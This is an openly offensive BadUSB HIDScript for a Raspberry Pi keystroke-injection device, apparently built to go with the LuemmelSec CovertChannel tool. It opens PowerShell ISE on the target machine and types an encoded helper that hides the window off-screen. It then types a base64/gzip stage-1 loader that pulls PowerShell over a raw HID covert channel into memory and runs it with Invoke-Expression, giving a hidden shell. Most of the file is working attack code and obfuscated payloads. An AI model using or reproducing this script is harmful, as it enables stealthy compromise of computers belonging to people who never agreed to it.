// Revamped covert channel script over USB
// use in combination with https://github.com/LuemmelSec/CovertChannel
// the tooling is already all in the image
// SSH into the Pi
// start /root/scripts/usb_covert_channel
// make sure you have a Custom HID device exposed to the client via the USB settings
// Fire this script via HIDScripts
// enjoy your shell over RawHID

//Stage 1 loader, gzip compressed and base64-encoded
s="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";
h="ZnVuY3Rpb24gU2V0LVdpbmRvdyB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddJFByb2Nlc3NOYW1lID0gJyonLA0KICAgICAgICBbaW50XSRJZCwNCiAgICAgICAgW2ludF0kWCwNCiAgICAgICAgW2ludF0kWSwNCiAgICAgICAgW2ludF0kV2lkdGgsDQogICAgICAgIFtpbnRdJEhlaWdodA0KICAgICkNCg0KICAgIGlmICgtbm90IChbdHlwZV06OkdldFR5cGUoJ1dpbmRvdycpKSkgew0KICAgICAgICBBZGQtVHlwZSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbmRvdyB7DQogICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXQ0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgR2V0V2luZG93UmVjdChJbnRQdHIgaFduZCwgb3V0IFJFQ1QgbHBSZWN0KTsNCg0KICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0NCiAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIE1vdmVXaW5kb3coSW50UHRyIGhXbmQsIGludCBYLCBpbnQgWSwgaW50IG5XaWR0aCwgaW50IG5IZWlnaHQsIGJvb2wgYlJlcGFpbnQpOw0KfQ0KcHVibGljIHN0cnVjdCBSRUNUIHsNCiAgICBwdWJsaWMgaW50IExlZnQsIFRvcCwgUmlnaHQsIEJvdHRvbTsNCn0NCiJADQogICAgfQ0KDQogICAgJHByb2Nlc3NlcyA9IGlmICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ0lkJykpIHsNCiAgICAgICAgR2V0LVByb2Nlc3MgLUlkICRJZCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gZWxzZSB7DQogICAgICAgIEdldC1Qcm9jZXNzIC1OYW1lICRQcm9jZXNzTmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0NCg0KICAgIGZvcmVhY2ggKCRwIGluICRwcm9jZXNzZXMpIHsNCiAgICAgICAgJGh3bmQgPSAkcC5NYWluV2luZG93SGFuZGxlDQogICAgICAgIGlmICgkaHduZCAtZXEgW0ludFB0cl06Olplcm8pIHsgY29udGludWUgfQ0KDQogICAgICAgIFtSRUNUXSRyZWN0ID0gTmV3LU9iamVjdCBSRUNUDQogICAgICAgIFtXaW5kb3ddOjpHZXRXaW5kb3dSZWN0KCRod25kLCBbcmVmXSRyZWN0KSB8IE91dC1OdWxsDQoNCiAgICAgICAgJHggPSBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdYJykpIHsgJFggfSBlbHNlIHsgJHJlY3QuTGVmdCB9DQogICAgICAgICR5ID0gaWYgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnWScpKSB7ICRZIH0gZWxzZSB7ICRyZWN0LlRvcCB9DQogICAgICAgICR3ID0gaWYgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnV2lkdGgnKSkgeyAkV2lkdGggfSBlbHNlIHsgJHJlY3QuUmlnaHQgLSAkcmVjdC5MZWZ0IH0NCiAgICAgICAgJGggPSBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdIZWlnaHQnKSkgeyAkSGVpZ2h0IH0gZWxzZSB7ICRyZWN0LkJvdHRvbSAtICRyZWN0LlRvcCB9DQoNCiAgICAgICAgW1dpbmRvd106Ok1vdmVXaW5kb3coJGh3bmQsICR4LCAkeSwgJHcsICRoLCAkdHJ1ZSkgfCBPdXQtTnVsbA0KICAgIH0NCn0=";

// sets typing speed to "natural" (global effect on all running script jobs)
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open PowerShell_ISE
function startPS() {
	press("GUI r");
	delay(500);
	type("powershell_ise\n")
}

// Hide an already opened PowerShell_ISE console, but keep input focus, to gon on typing
function hidePS() {
  	press ("CTRL d");
	type("Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"+h+"\')))");
  	press("ENTER");
    delay(4000);
  	type('Set-Window -ProcessName powershell_ise -X -2000 -Y -2000 -Width 20 -Height 20 -Passthru');
  	press("ENTER")
}


// Streams PS code via a HID channel into memory and executes the received result with IEX.
// PID and VID in used by the raw HID device have to be provided as string arguments in format "1D6B", "4137".
//
// The advantages of delivery via raw HID:
// - the channel allows to transfer large payloads silently (about 32KByte/s on USB 2.0)
// - the payload goes to memory, not to disk
// - combined with hidePS, typing out his stager could be done nearly invisible (2131 characters have to be typed here)
// The disadvantages of delivery via raw HID:
// - the payload is executed with Invoke-Expression (iex) after transfer, which is 'loud' again
// - the PID and VID of the (raw) HID device in use have to be known, in order to allow the stager to identify the device
//   (the stager manages to find the correct interface itself, if multiple HID interfaces, like keyboard and mouse, are up)

function hidDownAndIEX(vid, pid) {
  press ("CTRL d");
  type("$USB_VID='"+ vid +"';$USB_PID='" + pid +"';");
  type("$b='"+s+"';nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()");
  press("ENTER");
}

layout('de');			// keyboard layout
fast();

startPS();
delay(5000); // depending on how fast PS_ISE opens. Better to be on the save side, but feel free to experiment
hidePS();
delay(500);
hidDownAndIEX("1D6B", "1347"); // if you gave your Custom HID device different VID and PID you need to change this here
